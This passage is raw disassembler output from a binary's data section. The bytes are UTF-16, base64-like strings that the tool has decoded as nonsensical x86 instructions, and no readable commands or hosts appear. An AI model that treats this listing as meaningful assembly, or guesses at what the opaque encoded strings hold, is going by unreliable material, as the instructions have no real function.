1000416b:	38 00                	cmp    %al,(%eax)
1000416d:	34 00                	xor    $0x0,%al
1000416f:	52                   	push   %edx
10004170:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
10004174:	00 57 00             	add    %dl,0x0(%edi)
10004177:	63 00                	arpl   %eax,(%eax)
10004179:	6b 00 45             	imul   $0x45,(%eax),%eax
1000417c:	00 77 00             	add    %dh,0x0(%edi)
1000417f:	64 00 54 00 59       	add    %dl,%fs:0x59(%eax,%eax,1)
10004184:	00 3d 00 00 15 6f    	add    %bh,0x6f150000
1000418a:	00 38                	add    %bh,(%eax)
1000418c:	00 46 00             	add    %al,0x0(%esi)
1000418f:	58                   	pop    %eax
10004190:	00 56 00             	add    %dl,0x0(%esi)
10004193:	72 00                	jb     0x10004195
10004195:	41                   	inc    %ecx
10004196:	00 30                	add    %dh,(%eax)
10004198:	00 75 00             	add    %dh,0x0(%ebp)
1000419b:	36 00 00             	add    %al,%ss:(%eax)
1000419e:	79 55                	jns    0x100041f5
100041a0:	00 33                	add    %dh,(%ebx)
100041a2:	00 68 00             	add    %ch,0x0(%eax)
100041a5:	6d                   	insl   (%dx),%es:(%edi)
100041a6:	00 62 00             	add    %ah,0x0(%edx)
100041a9:	6d                   	insl   (%dx),%es:(%edi)
100041aa:	00 39                	add    %bh,(%ecx)
100041ac:	00 30                	add    %dh,(%eax)
100041ae:	00 4d 00             	add    %cl,0x0(%ebp)
100041b1:	6d                   	insl   (%dx),%es:(%edi)
100041b2:	00 78 00             	add    %bh,0x0(%eax)
100041b5:	6f                   	outsl  %ds:(%esi),(%dx)
100041b6:	00 51 00             	add    %dl,0x0(%ecx)
100041b9:	56                   	push   %esi
100041ba:	00 6b 00             	add    %ch,0x0(%ebx)
100041bd:	7a 00                	jp     0x100041bf
100041bf:	54                   	push   %esp
100041c0:	00 6c 00 4e          	add    %ch,0x4e(%eax,%eax,1)
100041c4:	00 34 00             	add    %dh,(%eax,%eax,1)
100041c7:	5a                   	pop    %edx
100041c8:	00 6d 00             	add    %ch,0x0(%ebp)
100041cb:	35 00 76 00 64       	xor    $0x64007600,%eax
100041d0:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
100041d4:	00 73 00             	add    %dh,0x0(%ebx)
100041d7:	61                   	popa
100041d8:	00 45 00             	add    %al,0x0(%ebp)
100041db:	46                   	inc    %esi
100041dc:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
100041e0:	00 47 00             	add    %al,0x0(%edi)
100041e3:	5a                   	pop    %edx
100041e4:	00 75 00             	add    %dh,0x0(%ebp)
100041e7:	62 00                	bound  %eax,(%eax)
100041e9:	33 00                	xor    (%eax),%eax
100041eb:	51                   	push   %ecx
100041ec:	00 79 00             	add    %bh,0x0(%ecx)
100041ef:	62 00                	bound  %eax,(%eax)
100041f1:	47                   	inc    %edi
100041f2:	00 68 00             	add    %ch,0x0(%eax)
100041f5:	42                   	inc    %edx
100041f6:	00 61 00             	add    %ah,0x0(%ecx)
100041f9:	6c                   	insb   (%dx),%es:(%edi)
100041fa:	00 4e 00             	add    %cl,0x0(%esi)
100041fd:	34 00                	xor    $0x0,%al
100041ff:	5a                   	pop    %edx
10004200:	00 6d 00             	add    %ch,0x0(%ebp)
10004203:	35 00 76 00 64       	xor    $0x64007600,%eax
10004208:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
1000420c:	00 73 00             	add    %dh,0x0(%ebx)
1000420f:	61                   	popa
10004210:	00 45 00             	add    %al,0x0(%ebp)
10004213:	45                   	inc    %ebp
10004214:	00 3d 00 00 15 53    	add    %bh,0x53150000
1000421a:	00 78 00             	add    %bh,0x0(%eax)
1000421d:	66 00 6e 00          	data16 add %ch,0x0(%esi)
10004221:	6f                   	outsl  %ds:(%esi),(%dx)
10004222:	00 74 00 32          	add    %dh,0x32(%eax,%eax,1)
10004226:	00 6c 00 68          	add    %ch,0x68(%eax,%eax,1)
1000422a:	00 41 00             	add    %al,0x0(%ecx)
1000422d:	00 81 71 62 00 30    	add    %al,0x30006271(%ecx)
10004233:	00 68 00             	add    %ch,0x0(%eax)
10004236:	33 00                	xor    (%eax),%eax
10004238:	5a                   	pop    %edx
10004239:	00 6b 00             	add    %ch,0x0(%ebx)
1000423c:	5a                   	pop    %edx
1000423d:	00 45 00             	add    %al,0x0(%ebp)
10004240:	53                   	push   %ebx
10004241:	00 48 00             	add    %cl,0x0(%eax)
10004244:	4a                   	dec    %edx
10004245:	00 6a 00             	add    %ch,0x0(%edx)
10004248:	61                   	popa
10004249:	00 31                	add    %dh,(%ecx)
1000424b:	00 4e 00             	add    %cl,0x0(%esi)
1000424e:	58                   	pop    %eax
1000424f:	00 4e 00             	add    %cl,0x0(%esi)
10004252:	57                   	push   %edi
10004253:	00 39                	add    %bh,(%ecx)
10004255:	00 49 00             	add    %cl,0x0(%ecx)
10004258:	64 00 32             	add    %dh,%fs:(%edx)
1000425b:	00 5a 00             	add    %bl,0x0(%edx)
1000425e:	47                   	inc    %edi
1000425f:	00 52 00             	add    %dl,0x0(%edx)
10004262:	45                   	inc    %ebp
10004263:	00 68 00             	add    %ch,0x0(%eax)
10004266:	79 00                	jns    0x10004268
10004268:	59                   	pop    %ecx
10004269:	00 32                	add    %dh,(%edx)
1000426b:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
1000426f:	00 53 00             	add    %dl,0x0(%ebx)
10004272:	48                   	dec    %eax
10004273:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
10004277:	00 52 00             	add    %dl,0x0(%edx)
1000427a:	6b 00 52             	imul   $0x52,(%eax),%eax
1000427d:	00 49 00             	add    %cl,0x0(%ecx)
10004280:	63 00                	arpl   %eax,(%eax)
10004282:	6d                   	insl   (%dx),%es:(%edi)
10004283:	00 4e 00             	add    %cl,0x0(%esi)
10004286:	72 00                	jb     0x10004288
10004288:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
1000428c:	52                   	push   %edx
1000428d:	00 48 00             	add    %cl,0x0(%eax)
10004290:	62 00                	bound  %eax,(%eax)
10004292:	30 00                	xor    %al,(%eax)
10004294:	68 00 33 00 5a       	push   $0x5a003300
10004299:	00 6b 00             	add    %ch,0x0(%ebx)
1000429c:	5a                   	pop    %edx
1000429d:	00 45 00             	add    %al,0x0(%ebp)
100042a0:	53                   	push   %ebx
100042a1:	00 48 00             	add    %cl,0x0(%eax)
100042a4:	4a                   	dec    %edx
100042a5:	00 6a 00             	add    %ch,0x0(%edx)
100042a8:	61                   	popa
100042a9:	00 32                	add    %dh,(%edx)
100042ab:	00 39                	add    %bh,(%ecx)
100042ad:	00 49 00             	add    %cl,0x0(%ecx)
100042b0:	64 00 32             	add    %dh,%fs:(%edx)
100042b3:	00 5a 00             	add    %bl,0x0(%edx)
100042b6:	47                   	inc    %edi
100042b7:	00 52 00             	add    %dl,0x0(%edx)
100042ba:	45                   	inc    %ebp
100042bb:	00 68 00             	add    %ch,0x0(%eax)
100042be:	79 00                	jns    0x100042c0
100042c0:	59                   	pop    %ecx
100042c1:	00 32                	add    %dh,(%edx)
100042c3:	00 74 00 47          	add    %dh,0x47(%eax,%eax,1)
100042c7:	00 63 00             	add    %ah,0x0(%ebx)
100042ca:	32 00                	xor    (%eax),%al
100042cc:	4a                   	dec    %edx
100042cd:	00 76 00             	add    %dh,0x0(%esi)
100042d0:	53                   	push   %ebx
100042d1:	00 48 00             	add    %cl,0x0(%eax)
100042d4:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
100042d8:	52                   	push   %edx
100042d9:	00 6b 00             	add    %ch,0x0(%ebx)
100042dc:	52                   	push   %edx
100042dd:	00 49 00             	add    %cl,0x0(%ecx)
100042e0:	63 00                	arpl   %eax,(%eax)
100042e2:	6d                   	insl   (%dx),%es:(%edi)
100042e3:	00 4e 00             	add    %cl,0x0(%esi)
100042e6:	72 00                	jb     0x100042e8
100042e8:	62 00                	bound  %eax,(%eax)
100042ea:	30 00                	xor    %al,(%eax)
100042ec:	68 00 33 00 5a       	push   $0x5a003300
100042f1:	00 6b 00             	add    %ch,0x0(%ebx)
100042f4:	5a                   	pop    %edx
100042f5:	00 45 00             	add    %al,0x0(%ebp)
100042f8:	53                   	push   %ebx
100042f9:	00 48 00             	add    %cl,0x0(%eax)
100042fc:	4a                   	dec    %edx
100042fd:	00 6a 00             	add    %ch,0x0(%edx)
10004300:	61                   	popa
10004301:	00 30                	add    %dh,(%eax)
10004303:	00 5a 00             	add    %bl,0x0(%edx)
10004306:	57                   	push   %edi
10004307:	00 4d 00             	add    %cl,0x0(%ebp)
1000430a:	47                   	inc    %edi
1000430b:	00 39                	add    %bh,(%ecx)
1000430d:	00 49 00             	add    %cl,0x0(%ecx)
10004310:	64 00 32             	add    %dh,%fs:(%edx)
10004313:	00 5a 00             	add    %bl,0x0(%edx)
10004316:	47                   	inc    %edi
10004317:	00 52 00             	add    %dl,0x0(%edx)
1000431a:	45                   	inc    %ebp
1000431b:	00 68 00             	add    %ch,0x0(%eax)
1000431e:	79 00                	jns    0x10004320
10004320:	59                   	pop    %ecx
10004321:	00 32                	add    %dh,(%edx)
10004323:	00 74 00 76          	add    %dh,0x76(%eax,%eax,1)
10004327:	00 53 00             	add    %dl,0x0(%ebx)
1000432a:	48                   	dec    %eax
1000432b:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
1000432f:	00 52 00             	add    %dl,0x0(%edx)
10004332:	6b 00 52             	imul   $0x52,(%eax),%eax
10004335:	00 49 00             	add    %cl,0x0(%ecx)
10004338:	63 00                	arpl   %eax,(%eax)
1000433a:	6d                   	insl   (%dx),%es:(%edi)
1000433b:	00 4e 00             	add    %cl,0x0(%esi)
1000433e:	72 00                	jb     0x10004340
10004340:	59                   	pop    %ecx
10004341:	00 56 00             	add    %dl,0x0(%esi)
10004344:	64 00 33             	add    %dh,%fs:(%ebx)
10004347:	00 62 00             	add    %ah,0x0(%edx)
1000434a:	30 00                	xor    %al,(%eax)
1000434c:	68 00 33 00 5a       	push   $0x5a003300
10004351:	00 6b 00             	add    %ch,0x0(%ebx)
10004354:	5a                   	pop    %edx
10004355:	00 45 00             	add    %al,0x0(%ebp)
10004358:	53                   	push   %ebx
10004359:	00 48 00             	add    %cl,0x0(%eax)
1000435c:	4a                   	dec    %edx
1000435d:	00 6a 00             	add    %ch,0x0(%edx)
10004360:	61                   	popa
10004361:	00 32                	add    %dh,(%edx)
10004363:	00 39                	add    %bh,(%ecx)
10004365:	00 49 00             	add    %cl,0x0(%ecx)
10004368:	64 00 32             	add    %dh,%fs:(%edx)
1000436b:	00 5a 00             	add    %bl,0x0(%edx)
1000436e:	47                   	inc    %edi
1000436f:	00 52 00             	add    %dl,0x0(%edx)
10004372:	45                   	inc    %ebp
10004373:	00 68 00             	add    %ch,0x0(%eax)
10004376:	79 00                	jns    0x10004378
10004378:	59                   	pop    %ecx
10004379:	00 32                	add    %dh,(%edx)
1000437b:	00 73 00             	add    %dh,0x0(%ebx)
1000437e:	39 00                	cmp    %eax,(%eax)
10004380:	62 00                	bound  %eax,(%eax)
10004382:	30 00                	xor    %al,(%eax)
10004384:	68 00 33 00 5a       	push   $0x5a003300
10004389:	00 6b 00             	add    %ch,0x0(%ebx)
1000438c:	5a                   	pop    %edx
1000438d:	00 45 00             	add    %al,0x0(%ebp)
10004390:	53                   	push   %ebx
10004391:	00 48 00             	add    %cl,0x0(%eax)
10004394:	4a                   	dec    %edx
10004395:	00 6a 00             	add    %ch,0x0(%edx)
10004398:	61                   	popa
10004399:	00 77 00             	add    %dh,0x0(%edi)
1000439c:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
100043a1:	15 6f 00 48 00       	adc    $0x48006f,%eax
100043a6:	77 00                	ja     0x100043a8
100043a8:	66 00 46 00          	data16 add %al,0x0(%esi)
100043ac:	44                   	inc    %esp
100043ad:	00 48 00             	add    %cl,0x0(%eax)
100043b0:	72 00                	jb     0x100043b2
100043b2:	63 00                	arpl   %eax,(%eax)
100043b4:	6b 00 00             	imul   $0x0,(%eax),%eax
100043b7:	80 f9 59             	cmp    $0x59,%cl
100043ba:	00 30                	add    %dh,(%eax)
100043bc:	00 49 00             	add    %cl,0x0(%ecx)
100043bf:	34 00                	xor    $0x0,%al
100043c1:	56                   	push   %esi
100043c2:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100043c6:	00 7a 00             	add    %bh,0x0(%edx)
100043c9:	61                   	popa
100043ca:	00 55 00             	add    %dl,0x0(%ebp)
100043cd:	49                   	dec    %ecx
100043ce:	00 78 00             	add    %bh,0x0(%eax)
100043d1:	59                   	pop    %ecx
100043d2:	00 32                	add    %dh,(%edx)
100043d4:	00 4a 00             	add    %cl,0x0(%edx)
100043d7:	74 00                	je     0x100043d9
100043d9:	5a                   	pop    %edx
100043da:	00 47 00             	add    %al,0x0(%edi)
100043dd:	4e                   	dec    %esi
100043de:	00 43 00             	add    %al,0x0(%ebx)
100043e1:	4f                   	dec    %edi
100043e2:	00 46 00             	add    %al,0x0(%esi)
100043e5:	55                   	push   %ebp
100043e6:	00 35 00 4d 00 32    	add    %dh,0x32004d00
100043ec:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
100043f0:	00 4d 00             	add    %cl,0x0(%ebp)
100043f3:	57                   	push   %edi
100043f4:	00 4e 00             	add    %cl,0x0(%esi)
100043f7:	6a 00                	push   $0x0
100043f9:	51                   	push   %ecx
100043fa:	00 6a 00             	add    %ch,0x0(%edx)
100043fd:	68 00 56 00 4f       	push   $0x4f005600
10004402:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
10004406:	00 70 00             	add    %dh,0x0(%eax)
10004409:	51                   	push   %ecx
1000440a:	00 6a 00             	add    %ch,0x0(%edx)
1000440d:	46                   	inc    %esi
1000440e:	00 6a 00             	add    %ch,0x0(%edx)
10004411:	62 00                	bound  %eax,(%eax)
10004413:	47                   	inc    %edi
10004414:	00 4a 00             	add    %cl,0x0(%edx)
10004417:	75 00                	jne    0x10004419
10004419:	59                   	pop    %ecx
1000441a:	00 30                	add    %dh,(%eax)
1000441c:	00 49 00             	add    %cl,0x0(%ecx)
1000441f:	34 00                	xor    $0x0,%al
10004421:	56                   	push   %esi
10004422:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10004426:	00 7a 00             	add    %bh,0x0(%edx)
10004429:	61                   	popa
1000442a:	00 55 00             	add    %dl,0x0(%ebp)
1000442d:	49                   	dec    %ecx
1000442e:	00 78 00             	add    %bh,0x0(%eax)
10004431:	59                   	pop    %ecx
10004432:	00 32                	add    %dh,(%edx)
10004434:	00 4e 00             	add    %cl,0x0(%esi)
10004437:	43                   	inc    %ebx
10004438:	00 4f 00             	add    %cl,0x0(%edi)
1000443b:	46                   	inc    %esi
1000443c:	00 55 00             	add    %dl,0x0(%ebp)
1000443f:	35 00 4d 00 32       	xor    $0x32004d00,%eax
10004444:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
10004448:	00 4d 00             	add    %cl,0x0(%ebp)
1000444b:	57                   	push   %edi
1000444c:	00 4e 00             	add    %cl,0x0(%esi)
1000444f:	53                   	push   %ebx
10004450:	00 61 00             	add    %ah,0x0(%ecx)
10004453:	47                   	inc    %edi
10004454:	00 4e 00             	add    %cl,0x0(%esi)
10004457:	6a 00                	push   $0x0
10004459:	51                   	push   %ecx
1000445a:	00 6a 00             	add    %ch,0x0(%edx)
1000445d:	68 00 56 00 4f       	push   $0x4f005600
10004462:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
10004466:	00 70 00             	add    %dh,0x0(%eax)
10004469:	51                   	push   %ecx
1000446a:	00 6a 00             	add    %ch,0x0(%edx)
1000446d:	46                   	inc    %esi
1000446e:	00 6a 00             	add    %ch,0x0(%edx)
10004471:	59                   	pop    %ecx
10004472:	00 30                	add    %dh,(%eax)
10004474:	00 49 00             	add    %cl,0x0(%ecx)
10004477:	34 00                	xor    $0x0,%al
10004479:	56                   	push   %esi
1000447a:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000447e:	00 7a 00             	add    %bh,0x0(%edx)
10004481:	61                   	popa
10004482:	00 55 00             	add    %dl,0x0(%ebp)
10004485:	49                   	dec    %ecx
10004486:	00 78 00             	add    %bh,0x0(%eax)
10004489:	59                   	pop    %ecx
1000448a:	00 7a 00             	add    %bh,0x0(%edx)
1000448d:	4a                   	dec    %edx
1000448e:	00 7a 00             	add    %bh,0x0(%edx)
10004491:	50                   	push   %eax
10004492:	00 57 00             	add    %dl,0x0(%edi)
10004495:	4e                   	dec    %esi
10004496:	00 43 00             	add    %al,0x0(%ebx)
10004499:	4f                   	dec    %edi
1000449a:	00 46 00             	add    %al,0x0(%esi)
1000449d:	55                   	push   %ebp
1000449e:	00 35 00 4d 00 32    	add    %dh,0x32004d00
100044a4:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
100044a8:	00 4d 00             	add    %cl,0x0(%ebp)
100044ab:	57                   	push   %edi
100044ac:	00 4d 00             	add    %cl,0x0(%ebp)
100044af:	3d 00 00 15 63       	cmp    $0x63150000,%eax
100044b4:	00 42 00             	add    %al,0x0(%edx)
100044b7:	38 00                	cmp    %al,(%eax)
100044b9:	55                   	push   %ebp
100044ba:	00 39                	add    %bh,(%ecx)
100044bc:	00 33                	add    %dh,(%ebx)
100044be:	00 69 00             	add    %ch,0x0(%ecx)
100044c1:	42                   	inc    %edx
100044c2:	00 31                	add    %dh,(%ecx)
100044c4:	00 63 00             	add    %ah,0x0(%ebx)
100044c7:	00 85 81 4d 00 32    	add    %al,0x32004d81(%ebp)
100044cd:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
100044d1:	00 55 00             	add    %dl,0x0(%ebp)
100044d4:	44                   	inc    %esp
100044d5:	00 46 00             	add    %al,0x0(%esi)
100044d8:	56                   	push   %esi
100044d9:	00 4f 00             	add    %cl,0x0(%edi)
100044dc:	54                   	push   %esp
100044dd:	00 63 00             	add    %ah,0x0(%ebx)
100044e0:	30 00                	xor    %al,(%eax)
100044e2:	55                   	push   %ebp
100044e3:	00 6c 00 46          	add    %ch,0x46(%eax,%eax,1)
100044e7:	00 36                	add    %dh,(%esi)
100044e9:	00 63 00             	add    %ah,0x0(%ebx)
100044ec:	44                   	inc    %esp
100044ed:	00 4e 00             	add    %cl,0x0(%esi)
100044f0:	70 00                	jo     0x100044f2
100044f2:	52                   	push   %edx
100044f3:	00 31                	add    %dh,(%ecx)
100044f5:	00 41 00             	add    %al,0x0(%ecx)
100044f8:	78 00                	js     0x100044fa
100044fa:	56                   	push   %esi
100044fb:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100044ff:	00 33                	add    %dh,(%ebx)
10004501:	00 4e 00             	add    %cl,0x0(%esi)
10004504:	46                   	inc    %esi
10004505:	00 49 00             	add    %cl,0x0(%ecx)
10004508:	7a 00                	jp     0x1000450a
1000450a:	61                   	popa
1000450b:	00 55 00             	add    %dl,0x0(%ebp)
1000450e:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
10004512:	4d                   	dec    %ebp
10004513:	00 56 00             	add    %dl,0x0(%esi)
10004516:	55                   	push   %ebp
10004517:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
1000451d:	00 52 00             	add    %dl,0x0(%edx)
10004520:	53                   	push   %ebx
10004521:	00 59 00             	add    %bl,0x0(%ecx)
10004524:	31 00                	xor    %eax,(%eax)
10004526:	68 00 47 00 4d       	push   $0x4d004700
1000452b:	00 32                	add    %dh,(%edx)
1000452d:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
10004531:	00 55 00             	add    %dl,0x0(%ebp)
10004534:	44                   	inc    %esp
10004535:	00 46 00             	add    %al,0x0(%esi)
10004538:	56                   	push   %esi
10004539:	00 4f 00             	add    %cl,0x0(%edi)
1000453c:	54                   	push   %esp
1000453d:	00 63 00             	add    %ah,0x0(%ebx)
10004540:	30 00                	xor    %al,(%eax)
10004542:	55                   	push   %ebp
10004543:	00 6a 00             	add    %ch,0x0(%edx)
10004546:	4e                   	dec    %esi
10004547:	00 70 00             	add    %dh,0x0(%eax)
1000454a:	52                   	push   %edx
1000454b:	00 31                	add    %dh,(%ecx)
1000454d:	00 41 00             	add    %al,0x0(%ecx)
10004550:	78 00                	js     0x10004552
10004552:	56                   	push   %esi
10004553:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
10004557:	00 33                	add    %dh,(%ebx)
10004559:	00 4e 00             	add    %cl,0x0(%esi)
1000455c:	46                   	inc    %esi
1000455d:	00 4a 00             	add    %cl,0x0(%edx)
10004560:	6b 00 63             	imul   $0x63,(%eax),%eax
10004563:	00 47 00             	add    %al,0x0(%edi)
10004566:	49                   	dec    %ecx
10004567:	00 7a 00             	add    %bh,0x0(%edx)
1000456a:	61                   	popa
1000456b:	00 55 00             	add    %dl,0x0(%ebp)
1000456e:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
10004572:	4d                   	dec    %ebp
10004573:	00 56 00             	add    %dl,0x0(%esi)
10004576:	55                   	push   %ebp
10004577:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
1000457d:	00 52 00             	add    %dl,0x0(%edx)
10004580:	53                   	push   %ebx
10004581:	00 4d 00             	add    %cl,0x0(%ebp)
10004584:	32 00                	xor    (%eax),%al
10004586:	6c                   	insb   (%dx),%es:(%edi)
10004587:	00 48 00             	add    %cl,0x0(%eax)
1000458a:	55                   	push   %ebp
1000458b:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
1000458f:	00 56 00             	add    %dl,0x0(%esi)
10004592:	4f                   	dec    %edi
10004593:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10004597:	00 30                	add    %dh,(%eax)
10004599:	00 55 00             	add    %dl,0x0(%ebp)
1000459c:	6d                   	insl   (%dx),%es:(%edi)
1000459d:	00 31                	add    %dh,(%ecx)
1000459f:	00 53 00             	add    %dl,0x0(%ebx)
100045a2:	64 00 6a 00          	add    %ch,%fs:0x0(%edx)
100045a6:	4e                   	dec    %esi
100045a7:	00 70 00             	add    %dh,0x0(%eax)
100045aa:	52                   	push   %edx
100045ab:	00 31                	add    %dh,(%ecx)
100045ad:	00 41 00             	add    %al,0x0(%ecx)
100045b0:	78 00                	js     0x100045b2
100045b2:	56                   	push   %esi
100045b3:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100045b7:	00 33                	add    %dh,(%ebx)
100045b9:	00 4e 00             	add    %cl,0x0(%esi)
100045bc:	46                   	inc    %esi
100045bd:	00 49 00             	add    %cl,0x0(%ecx)
100045c0:	7a 00                	jp     0x100045c2
100045c2:	61                   	popa
100045c3:	00 55 00             	add    %dl,0x0(%ebp)
100045c6:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
100045ca:	4d                   	dec    %ebp
100045cb:	00 56 00             	add    %dl,0x0(%esi)
100045ce:	55                   	push   %ebp
100045cf:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
100045d5:	00 52 00             	add    %dl,0x0(%edx)
100045d8:	53                   	push   %ebx
100045d9:	00 5a 00             	add    %bl,0x0(%edx)
100045dc:	44                   	inc    %esp
100045dd:	00 4e 00             	add    %cl,0x0(%esi)
100045e0:	4f                   	dec    %edi
100045e1:	00 4d 00             	add    %cl,0x0(%ebp)
100045e4:	32 00                	xor    (%eax),%al
100045e6:	6c                   	insb   (%dx),%es:(%edi)
100045e7:	00 48 00             	add    %cl,0x0(%eax)
100045ea:	55                   	push   %ebp
100045eb:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
100045ef:	00 56 00             	add    %dl,0x0(%esi)
100045f2:	4f                   	dec    %edi
100045f3:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
100045f7:	00 30                	add    %dh,(%eax)
100045f9:	00 55 00             	add    %dl,0x0(%ebp)
100045fc:	6a 00                	push   $0x0
100045fe:	4e                   	dec    %esi
100045ff:	00 70 00             	add    %dh,0x0(%eax)
10004602:	52                   	push   %edx
10004603:	00 31                	add    %dh,(%ecx)
10004605:	00 41 00             	add    %al,0x0(%ecx)
10004608:	78 00                	js     0x1000460a
1000460a:	56                   	push   %esi
1000460b:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000460f:	00 33                	add    %dh,(%ebx)
10004611:	00 4e 00             	add    %cl,0x0(%esi)
10004614:	46                   	inc    %esi
10004615:	00 4a 00             	add    %cl,0x0(%edx)
10004618:	6a 00                	push   $0x0
1000461a:	57                   	push   %edi
1000461b:	00 45 00             	add    %al,0x0(%ebp)
1000461e:	55                   	push   %ebp
1000461f:	00 7a 00             	add    %bh,0x0(%edx)
10004622:	61                   	popa
10004623:	00 55 00             	add    %dl,0x0(%ebp)
10004626:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
1000462a:	4d                   	dec    %ebp
1000462b:	00 56 00             	add    %dl,0x0(%esi)
1000462e:	55                   	push   %ebp
1000462f:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
10004635:	00 52 00             	add    %dl,0x0(%edx)
10004638:	53                   	push   %ebx
10004639:	00 4d 00             	add    %cl,0x0(%ebp)
1000463c:	32 00                	xor    (%eax),%al
1000463e:	6c                   	insb   (%dx),%es:(%edi)
1000463f:	00 48 00             	add    %cl,0x0(%eax)
10004642:	55                   	push   %ebp
10004643:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
10004647:	00 56 00             	add    %dl,0x0(%esi)
1000464a:	4f                   	dec    %edi
1000464b:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
1000464f:	00 30                	add    %dh,(%eax)
10004651:	00 55 00             	add    %dl,0x0(%ebp)
10004654:	6a 00                	push   $0x0
10004656:	46                   	inc    %esi
10004657:	00 77 00             	add    %dh,0x0(%edi)
1000465a:	57                   	push   %edi
1000465b:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
1000465f:	00 70 00             	add    %dh,0x0(%eax)
10004662:	52                   	push   %edx
10004663:	00 31                	add    %dh,(%ecx)
10004665:	00 41 00             	add    %al,0x0(%ecx)
10004668:	78 00                	js     0x1000466a
1000466a:	56                   	push   %esi
1000466b:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
1000466f:	00 33                	add    %dh,(%ebx)
10004671:	00 4e 00             	add    %cl,0x0(%esi)
10004674:	46                   	inc    %esi
10004675:	00 49 00             	add    %cl,0x0(%ecx)
10004678:	7a 00                	jp     0x1000467a
1000467a:	61                   	popa
1000467b:	00 55 00             	add    %dl,0x0(%ebp)
1000467e:	64 00 51 00          	add    %dl,%fs:0x0(%ecx)
10004682:	4d                   	dec    %ebp
10004683:	00 56 00             	add    %dl,0x0(%esi)
10004686:	55                   	push   %ebp
10004687:	00 35 00 4e 00 7a    	add    %dh,0x7a004e00
1000468d:	00 52 00             	add    %dl,0x0(%edx)
10004690:	53                   	push   %ebx
10004691:	00 4d 00             	add    %cl,0x0(%ebp)
10004694:	30 00                	xor    %al,(%eax)
10004696:	70 00                	jo     0x10004698
10004698:	32 00                	xor    (%eax),%al
1000469a:	4d                   	dec    %ebp
1000469b:	00 32                	add    %dh,(%edx)
1000469d:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
100046a1:	00 55 00             	add    %dl,0x0(%ebp)
100046a4:	44                   	inc    %esp
100046a5:	00 46 00             	add    %al,0x0(%esi)
100046a8:	56                   	push   %esi
100046a9:	00 4f 00             	add    %cl,0x0(%edi)
100046ac:	54                   	push   %esp
100046ad:	00 63 00             	add    %ah,0x0(%ebx)
100046b0:	30 00                	xor    %al,(%eax)
100046b2:	55                   	push   %ebp
100046b3:	00 6a 00             	add    %ch,0x0(%edx)
100046b6:	4e                   	dec    %esi
100046b7:	00 70 00             	add    %dh,0x0(%eax)
100046ba:	52                   	push   %edx
100046bb:	00 31                	add    %dh,(%ecx)
100046bd:	00 41 00             	add    %al,0x0(%ecx)
100046c0:	78 00                	js     0x100046c2
100046c2:	56                   	push   %esi
100046c3:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
100046c7:	00 33                	add    %dh,(%ebx)
100046c9:	00 4e 00             	add    %cl,0x0(%esi)
100046cc:	46                   	inc    %esi
100046cd:	00 4a 00             	add    %cl,0x0(%edx)
100046d0:	6a 00                	push   $0x0
100046d2:	4d                   	dec    %ebp
100046d3:	00 6a 00             	add    %ch,0x0(%edx)
100046d6:	6b 00 7a             	imul   $0x7a,(%eax),%eax
100046d9:	00 61 00             	add    %ah,0x0(%ecx)
100046dc:	55                   	push   %ebp
100046dd:	00 64 00 51          	add    %ah,0x51(%eax,%eax,1)
100046e1:	00 4d 00             	add    %cl,0x0(%ebp)
100046e4:	56                   	push   %esi
100046e5:	00 55 00             	add    %dl,0x0(%ebp)
100046e8:	35 00 4e 00 7a       	xor    $0x7a004e00,%eax
100046ed:	00 52 00             	add    %dl,0x0(%edx)
100046f0:	53                   	push   %ebx
100046f1:	00 4d 00             	add    %cl,0x0(%ebp)
100046f4:	32 00                	xor    (%eax),%al
100046f6:	6c                   	insb   (%dx),%es:(%edi)
100046f7:	00 48 00             	add    %cl,0x0(%eax)
100046fa:	55                   	push   %ebp
100046fb:	00 44 00 46          	add    %al,0x46(%eax,%eax,1)
100046ff:	00 56 00             	add    %dl,0x0(%esi)
10004702:	4f                   	dec    %edi
10004703:	00 54 00 63          	add    %dl,0x63(%eax,%eax,1)
10004707:	00 30                	add    %dh,(%eax)
10004709:	00 55 00             	add    %dl,0x0(%ebp)
1000470c:	6d                   	insl   (%dx),%es:(%edi)
1000470d:	00 31                	add    %dh,(%ecx)
1000470f:	00 6b 00             	add    %ch,0x0(%ebx)
10004712:	51                   	push   %ecx
